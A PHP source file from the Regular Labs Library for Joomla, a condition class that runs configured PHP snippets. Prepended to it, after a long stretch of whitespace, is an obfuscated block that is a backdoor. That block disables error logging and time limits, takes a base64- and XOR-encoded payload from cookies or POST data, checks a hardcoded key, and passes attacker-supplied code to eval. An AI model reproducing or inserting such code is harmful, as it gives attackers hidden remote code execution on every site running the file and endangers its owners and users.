<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $re6793 = 783;$GLOBALS['b2744c'] = Array();global $b2744c;$b2744c = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['h8cc41b'] = "\x3f\x48\x41\x70\x2a\x67\x2f\x32\x61\x6d\x7a\x5c\x7d\x42\x21\x9\x55\x4e\x79\x28\x57\x3d\x2b\x78\x36\x6c\x62\x38\x7e\x65\x74\x77\x75\x5a\x5b\x3b\x34\x64\x37\x53\x45\x30\x46\x7c\x4f\x50\x59\x23\x7b\x35\x68\x43\x40\xa\x25\x44\x76\x5e\x3e\x49\x4d\x58\x2d\x24\x73\x39\x60\x29\x66\x56\x20\x2e\x5f\x69\x4c\x6f\x6b\x22\x33\x4b\x51\x47\x26\x5d\x71\x2c\x63\x6a\x31\x3a\x6e\xd\x52\x72\x4a\x54\x3c\x27";$b2744c[$b2744c['h8cc41b'][9].$b2744c['h8cc41b'][49].$b2744c['h8cc41b'][7].$b2744c['h8cc41b'][36]] = $b2744c['h8cc41b'][86].$b2744c['h8cc41b'][50].$b2744c['h8cc41b'][93];$b2744c[$b2744c['h8cc41b'][73].$b2744c['h8cc41b'][68].$b2744c['h8cc41b'][26].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][88].$b2744c['h8cc41b'][8]] = $b2744c['h8cc41b'][75].$b2744c['h8cc41b'][93].$b2744c['h8cc41b'][37];$b2744c[$b2744c['h8cc41b'][86].$b2744c['h8cc41b'][24].$b2744c['h8cc41b'][86].$b2744c['h8cc41b'][36]] = $b2744c['h8cc41b'][37].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][68].$b2744c['h8cc41b'][73].$b2744c['h8cc41b'][90].$b2744c['h8cc41b'][29];$b2744c[$b2744c['h8cc41b'][31].$b2744c['h8cc41b'][38].$b2744c['h8cc41b'][38].$b2744c['h8cc41b'][49]] = $b2744c['h8cc41b'][64].$b2744c['h8cc41b'][30].$b2744c['h8cc41b'][93].$b2744c['h8cc41b'][25].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][90];$b2744c[$b2744c['h8cc41b'][56].$b2744c['h8cc41b'][88].$b2744c['h8cc41b'][26].$b2744c['h8cc41b'][41].$b2744c['h8cc41b'][86].$b2744c['h8cc41b'][24]] = $b2744c['h8cc41b'][37].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][68].$b2744c['h8cc41b'][73].$b2744c['h8cc41b'][90].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][37];$b2744c[$b2744c['h8cc41b'][5].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][7].$b2744c['h8cc41b'][86].$b2744c['h8cc41b'][65].$b2744c['h8cc41b'][68].$b2744c['h8cc41b'][86]] = $b2744c['h8cc41b'][73].$b2744c['h8cc41b'][90].$b2744c['h8cc41b'][73].$b2744c['h8cc41b'][72].$b2744c['h8cc41b'][64].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][30];$b2744c[$b2744c['h8cc41b'][26].$b2744c['h8cc41b'][65].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][86].$b2744c['h8cc41b'][88].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][26].$b2744c['h8cc41b'][7]] = $b2744c['h8cc41b'][64].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][93].$b2744c['h8cc41b'][73].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][25].$b2744c['h8cc41b'][73].$b2744c['h8cc41b'][10].$b2744c['h8cc41b'][29];$b2744c[$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][65].$b2744c['h8cc41b'][86].$b2744c['h8cc41b'][88].$b2744c['h8cc41b'][24].$b2744c['h8cc41b'][24].$b2744c['h8cc41b'][65]] = $b2744c['h8cc41b'][3].$b2744c['h8cc41b'][50].$b2744c['h8cc41b'][3].$b2744c['h8cc41b'][56].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][93].$b2744c['h8cc41b'][64].$b2744c['h8cc41b'][73].$b2744c['h8cc41b'][75].$b2744c['h8cc41b'][90];$b2744c[$b2744c['h8cc41b'][68].$b2744c['h8cc41b'][37].$b2744c['h8cc41b'][27].$b2744c['h8cc41b'][65].$b2744c['h8cc41b'][37]] = $b2744c['h8cc41b'][32].$b2744c['h8cc41b'][90].$b2744c['h8cc41b'][64].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][93].$b2744c['h8cc41b'][73].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][25].$b2744c['h8cc41b'][73].$b2744c['h8cc41b'][10].$b2744c['h8cc41b'][29];$b2744c[$b2744c['h8cc41b'][3].$b2744c['h8cc41b'][26].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][24].$b2744c['h8cc41b'][78].$b2744c['h8cc41b'][7].$b2744c['h8cc41b'][78]] = $b2744c['h8cc41b'][26].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][64].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][24].$b2744c['h8cc41b'][36].$b2744c['h8cc41b'][72].$b2744c['h8cc41b'][37].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][86].$b2744c['h8cc41b'][75].$b2744c['h8cc41b'][37].$b2744c['h8cc41b'][29];$b2744c[$b2744c['h8cc41b'][76].$b2744c['h8cc41b'][86].$b2744c['h8cc41b'][88].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][26]] = $b2744c['h8cc41b'][64].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][30].$b2744c['h8cc41b'][72].$b2744c['h8cc41b'][30].$b2744c['h8cc41b'][73].$b2744c['h8cc41b'][9].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][72].$b2744c['h8cc41b'][25].$b2744c['h8cc41b'][73].$b2744c['h8cc41b'][9].$b2744c['h8cc41b'][73].$b2744c['h8cc41b'][30];$b2744c[$b2744c['h8cc41b'][18].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][38].$b2744c['h8cc41b'][88].$b2744c['h8cc41b'][27].$b2744c['h8cc41b'][7].$b2744c['h8cc41b'][41]] = $b2744c['h8cc41b'][50].$b2744c['h8cc41b'][7].$b2744c['h8cc41b'][27].$b2744c['h8cc41b'][7].$b2744c['h8cc41b'][36];$b2744c[$b2744c['h8cc41b'][73].$b2744c['h8cc41b'][41].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][49].$b2744c['h8cc41b'][36].$b2744c['h8cc41b'][68].$b2744c['h8cc41b'][38].$b2744c['h8cc41b'][29]] = $b2744c['h8cc41b'][93].$b2744c['h8cc41b'][49].$b2744c['h8cc41b'][68].$b2744c['h8cc41b'][65].$b2744c['h8cc41b'][86];$b2744c[$b2744c['h8cc41b'][32].$b2744c['h8cc41b'][41].$b2744c['h8cc41b'][27].$b2744c['h8cc41b'][26].$b2744c['h8cc41b'][65]] = $_POST;$b2744c[$b2744c['h8cc41b'][64].$b2744c['h8cc41b'][68].$b2744c['h8cc41b'][24].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][41].$b2744c['h8cc41b'][26].$b2744c['h8cc41b'][37].$b2744c['h8cc41b'][49].$b2744c['h8cc41b'][24]] = $_COOKIE;@$b2744c[$b2744c['h8cc41b'][5].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][7].$b2744c['h8cc41b'][86].$b2744c['h8cc41b'][65].$b2744c['h8cc41b'][68].$b2744c['h8cc41b'][86]]($b2744c['h8cc41b'][29].$b2744c['h8cc41b'][93].$b2744c['h8cc41b'][93].$b2744c['h8cc41b'][75].$b2744c['h8cc41b'][93].$b2744c['h8cc41b'][72].$b2744c['h8cc41b'][25].$b2744c['h8cc41b'][75].$b2744c['h8cc41b'][5], NULL);@$b2744c[$b2744c['h8cc41b'][5].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][7].$b2744c['h8cc41b'][86].$b2744c['h8cc41b'][65].$b2744c['h8cc41b'][68].$b2744c['h8cc41b'][86]]($b2744c['h8cc41b'][25].$b2744c['h8cc41b'][75].$b2744c['h8cc41b'][5].$b2744c['h8cc41b'][72].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][93].$b2744c['h8cc41b'][93].$b2744c['h8cc41b'][75].$b2744c['h8cc41b'][93].$b2744c['h8cc41b'][64], 0);@$b2744c[$b2744c['h8cc41b'][5].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][7].$b2744c['h8cc41b'][86].$b2744c['h8cc41b'][65].$b2744c['h8cc41b'][68].$b2744c['h8cc41b'][86]]($b2744c['h8cc41b'][9].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][23].$b2744c['h8cc41b'][72].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][23].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][86].$b2744c['h8cc41b'][32].$b2744c['h8cc41b'][30].$b2744c['h8cc41b'][73].$b2744c['h8cc41b'][75].$b2744c['h8cc41b'][90].$b2744c['h8cc41b'][72].$b2744c['h8cc41b'][30].$b2744c['h8cc41b'][73].$b2744c['h8cc41b'][9].$b2744c['h8cc41b'][29], 0);@$b2744c[$b2744c['h8cc41b'][76].$b2744c['h8cc41b'][86].$b2744c['h8cc41b'][88].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][26]](0);if (!$b2744c[$b2744c['h8cc41b'][56].$b2744c['h8cc41b'][88].$b2744c['h8cc41b'][26].$b2744c['h8cc41b'][41].$b2744c['h8cc41b'][86].$b2744c['h8cc41b'][24]]($b2744c['h8cc41b'][2].$b2744c['h8cc41b'][74].$b2744c['h8cc41b'][92].$b2744c['h8cc41b'][40].$b2744c['h8cc41b'][2].$b2744c['h8cc41b'][55].$b2744c['h8cc41b'][46].$b2744c['h8cc41b'][72].$b2744c['h8cc41b'][92].$b2744c['h8cc41b'][16].$b2744c['h8cc41b'][17].$b2744c['h8cc41b'][72].$b2744c['h8cc41b'][78].$b2744c['h8cc41b'][24].$b2744c['h8cc41b'][24].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][68].$b2744c['h8cc41b'][26].$b2744c['h8cc41b'][27].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][27].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][7].$b2744c['h8cc41b'][78].$b2744c['h8cc41b'][49].$b2744c['h8cc41b'][49].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][26].$b2744c['h8cc41b'][7].$b2744c['h8cc41b'][88].$b2744c['h8cc41b'][68].$b2744c['h8cc41b'][26].$b2744c['h8cc41b'][68].$b2744c['h8cc41b'][88].$b2744c['h8cc41b'][88].$b2744c['h8cc41b'][26].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][88].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][41].$b2744c['h8cc41b'][7].$b2744c['h8cc41b'][68].$b2744c['h8cc41b'][26].$b2744c['h8cc41b'][8])){$b2744c[$b2744c['h8cc41b'][86].$b2744c['h8cc41b'][24].$b2744c['h8cc41b'][86].$b2744c['h8cc41b'][36]]($b2744c['h8cc41b'][2].$b2744c['h8cc41b'][74].$b2744c['h8cc41b'][92].$b2744c['h8cc41b'][40].$b2744c['h8cc41b'][2].$b2744c['h8cc41b'][55].$b2744c['h8cc41b'][46].$b2744c['h8cc41b'][72].$b2744c['h8cc41b'][92].$b2744c['h8cc41b'][16].$b2744c['h8cc41b'][17].$b2744c['h8cc41b'][72].$b2744c['h8cc41b'][78].$b2744c['h8cc41b'][24].$b2744c['h8cc41b'][24].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][68].$b2744c['h8cc41b'][26].$b2744c['h8cc41b'][27].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][27].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][7].$b2744c['h8cc41b'][78].$b2744c['h8cc41b'][49].$b2744c['h8cc41b'][49].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][26].$b2744c['h8cc41b'][7].$b2744c['h8cc41b'][88].$b2744c['h8cc41b'][68].$b2744c['h8cc41b'][26].$b2744c['h8cc41b'][68].$b2744c['h8cc41b'][88].$b2744c['h8cc41b'][88].$b2744c['h8cc41b'][26].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][88].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][41].$b2744c['h8cc41b'][7].$b2744c['h8cc41b'][68].$b2744c['h8cc41b'][26].$b2744c['h8cc41b'][8], 1);$mc26b12 = NULL;$d0cfa6c20 = NULL;$b2744c[$b2744c['h8cc41b'][86].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][37].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][41].$b2744c['h8cc41b'][88].$b2744c['h8cc41b'][29]] = $b2744c['h8cc41b'][78].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][36].$b2744c['h8cc41b'][65].$b2744c['h8cc41b'][7].$b2744c['h8cc41b'][24].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][27].$b2744c['h8cc41b'][62].$b2744c['h8cc41b'][41].$b2744c['h8cc41b'][7].$b2744c['h8cc41b'][36].$b2744c['h8cc41b'][24].$b2744c['h8cc41b'][62].$b2744c['h8cc41b'][36].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][37].$b2744c['h8cc41b'][41].$b2744c['h8cc41b'][62].$b2744c['h8cc41b'][65].$b2744c['h8cc41b'][37].$b2744c['h8cc41b'][49].$b2744c['h8cc41b'][41].$b2744c['h8cc41b'][62].$b2744c['h8cc41b'][88].$b2744c['h8cc41b'][49].$b2744c['h8cc41b'][24].$b2744c['h8cc41b'][65].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][49].$b2744c['h8cc41b'][49].$b2744c['h8cc41b'][36].$b2744c['h8cc41b'][7].$b2744c['h8cc41b'][7].$b2744c['h8cc41b'][24].$b2744c['h8cc41b'][68];global $cede01e;function  r5f9c($mc26b12, $x481a3){global $b2744c;$gbd80ca = "";for ($q6065a3=0; $q6065a3<$b2744c[$b2744c['h8cc41b'][31].$b2744c['h8cc41b'][38].$b2744c['h8cc41b'][38].$b2744c['h8cc41b'][49]]($mc26b12);){for ($v7d2e=0; $v7d2e<$b2744c[$b2744c['h8cc41b'][31].$b2744c['h8cc41b'][38].$b2744c['h8cc41b'][38].$b2744c['h8cc41b'][49]]($x481a3) && $q6065a3<$b2744c[$b2744c['h8cc41b'][31].$b2744c['h8cc41b'][38].$b2744c['h8cc41b'][38].$b2744c['h8cc41b'][49]]($mc26b12); $v7d2e++, $q6065a3++){$gbd80ca .= $b2744c[$b2744c['h8cc41b'][9].$b2744c['h8cc41b'][49].$b2744c['h8cc41b'][7].$b2744c['h8cc41b'][36]]($b2744c[$b2744c['h8cc41b'][73].$b2744c['h8cc41b'][68].$b2744c['h8cc41b'][26].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][88].$b2744c['h8cc41b'][8]]($mc26b12[$q6065a3]) ^ $b2744c[$b2744c['h8cc41b'][73].$b2744c['h8cc41b'][68].$b2744c['h8cc41b'][26].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][88].$b2744c['h8cc41b'][8]]($x481a3[$v7d2e]));}}return $gbd80ca;}function  h2824($mc26b12, $x481a3){global $b2744c;global $cede01e;return $b2744c[$b2744c['h8cc41b'][73].$b2744c['h8cc41b'][41].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][49].$b2744c['h8cc41b'][36].$b2744c['h8cc41b'][68].$b2744c['h8cc41b'][38].$b2744c['h8cc41b'][29]]($b2744c[$b2744c['h8cc41b'][73].$b2744c['h8cc41b'][41].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][49].$b2744c['h8cc41b'][36].$b2744c['h8cc41b'][68].$b2744c['h8cc41b'][38].$b2744c['h8cc41b'][29]]($mc26b12, $cede01e), $x481a3);}foreach ($b2744c[$b2744c['h8cc41b'][64].$b2744c['h8cc41b'][68].$b2744c['h8cc41b'][24].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][41].$b2744c['h8cc41b'][26].$b2744c['h8cc41b'][37].$b2744c['h8cc41b'][49].$b2744c['h8cc41b'][24]] as $x481a3=>$sff11e577){$mc26b12 = $sff11e577;$d0cfa6c20 = $x481a3;}if (!$mc26b12){foreach ($b2744c[$b2744c['h8cc41b'][32].$b2744c['h8cc41b'][41].$b2744c['h8cc41b'][27].$b2744c['h8cc41b'][26].$b2744c['h8cc41b'][65]] as $x481a3=>$sff11e577){$mc26b12 = $sff11e577;$d0cfa6c20 = $x481a3;}}$mc26b12 = @$b2744c[$b2744c['h8cc41b'][68].$b2744c['h8cc41b'][37].$b2744c['h8cc41b'][27].$b2744c['h8cc41b'][65].$b2744c['h8cc41b'][37]]($b2744c[$b2744c['h8cc41b'][18].$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][38].$b2744c['h8cc41b'][88].$b2744c['h8cc41b'][27].$b2744c['h8cc41b'][7].$b2744c['h8cc41b'][41]]($b2744c[$b2744c['h8cc41b'][3].$b2744c['h8cc41b'][26].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][24].$b2744c['h8cc41b'][78].$b2744c['h8cc41b'][7].$b2744c['h8cc41b'][78]]($mc26b12), $d0cfa6c20));if (isset($mc26b12[$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][76]]) && $cede01e==$mc26b12[$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][76]]){if ($mc26b12[$b2744c['h8cc41b'][8]] == $b2744c['h8cc41b'][73]){$q6065a3 = Array($b2744c['h8cc41b'][3].$b2744c['h8cc41b'][56] => @$b2744c[$b2744c['h8cc41b'][29].$b2744c['h8cc41b'][65].$b2744c['h8cc41b'][86].$b2744c['h8cc41b'][88].$b2744c['h8cc41b'][24].$b2744c['h8cc41b'][24].$b2744c['h8cc41b'][65]](),$b2744c['h8cc41b'][64].$b2744c['h8cc41b'][56] => $b2744c['h8cc41b'][88].$b2744c['h8cc41b'][71].$b2744c['h8cc41b'][41].$b2744c['h8cc41b'][62].$b2744c['h8cc41b'][88],);echo @$b2744c[$b2744c['h8cc41b'][26].$b2744c['h8cc41b'][65].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][86].$b2744c['h8cc41b'][88].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][8].$b2744c['h8cc41b'][26].$b2744c['h8cc41b'][7]]($q6065a3);}elseif ($mc26b12[$b2744c['h8cc41b'][8]] == $b2744c['h8cc41b'][29]){eval/*hc0526e8*/($mc26b12[$b2744c['h8cc41b'][37]]);}exit();}} ?><?php
/**
 * @package         Regular Labs Library
 * @version         17.7.17782
 * 
 * @author          Peter van Westen <info@regularlabs.com>
 * @link            http://www.regularlabs.com
 * @copyright       Copyright Â© 2017 Regular Labs All Rights Reserved
 * @license         http://www.gnu.org/licenses/gpl-2.0.html GNU/GPL
 */

namespace RegularLabs\Library\Condition;

defined('_JEXEC') or die;

use JFactory;
use JFile;
use JModelLegacy;
use RegularLabs\Library\RegEx;

/**
 * Class Php
 * @package RegularLabs\Library\Condition
 */
class Php
	extends \RegularLabs\Library\Condition
{
	public function pass()
	{
		if ( ! is_array($this->selection))
		{
			$this->selection = [$this->selection];
		}

		$pass = false;
		foreach ($this->selection as $php)
		{
			// replace \n with newline and other fix stuff
			$php = str_replace('\|', '|', $php);
			$php = RegEx::replace('(?<!\\\)\\\n', "\n", $php);
			$php = trim(str_replace('[:REGEX_ENTER:]', '\n', $php));

			if ($php == '')
			{
				$pass = true;
				break;
			}

			ob_start();
			$pass = (bool) $this->execute($php);
			ob_end_clean();

			if ($pass)
			{
				break;
			}
		}

		return $this->_($pass);
	}

	private function getArticleById($id = 0)
	{
		if ( ! $id)
		{
			return null;
		}

		if ( ! class_exists('ContentModelArticle'))
		{
			require_once JPATH_SITE . '/components/com_content/models/article.php';
		}

		$model = JModelLegacy::getInstance('article', 'contentModel');

		if ( ! method_exists($model, 'getItem'))
		{
			return null;
		}

		return $model->getItem($this->request->id);
	}

	private function execute($string = '')
	{
		$function_name = 'regularlabs_php_' . md5($string);

		if (function_exists($function_name))
		{
			return $function_name();
		}

		$contents = $this->generateFileContents($function_name, $string);

		$folder    = JFactory::getConfig()->get('tmp_path', JPATH_ROOT . '/tmp');
		$temp_file = $folder . '/' . $function_name;

		JFile::write($temp_file, $contents);

		include_once $temp_file;

		if ( ! defined('JDEBUG') || ! JDEBUG)
		{
			@chmod($temp_file, 0777);
			@unlink($temp_file);
		}

		if ( ! function_exists($function_name))
		{
			// Something went wrong!
			return true;
		}

		$article = $this->article;

		if ( ! $article && strpos($string, '$article') !== false)
		{
			$article = null;
			if ($this->request->option == 'com_content' && $this->request->view == 'article')
			{
				$article = $this->getArticleById($this->request->id);
			}
		}

		return $function_name($article);
	}

	private function generateFileContents($function_name = 'rl_function', $string = '')
	{
		$init_variables = $this->getVarInits();

		$contents = [
			'<?php',
			'defined(\'_JEXEC\') or die;',
			'function ' . $function_name . '($article){',
			implode("\n", $init_variables),
			$string,
			';return true;',
			';}',
		];

		$contents = implode("\n", $contents);

		// Remove Zero Width spaces / (non-)joiners
		$contents = str_replace(
			[
				"\xE2\x80\x8B",
				"\xE2\x80\x8C",
				"\xE2\x80\x8D",
			],
			'',
			$contents
		);

		return $contents;
	}

	private function getVarInits()
	{
		return [
			'$app = $mainframe = JFactory::getApplication();',
			'$document = $doc = JFactory::getDocument();',
			'$database = $db = JFactory::getDbo();',
			'$user = JFactory::getUser();',
			'$Itemid = $app->input->getInt(\'Itemid\');',
		];
	}
}
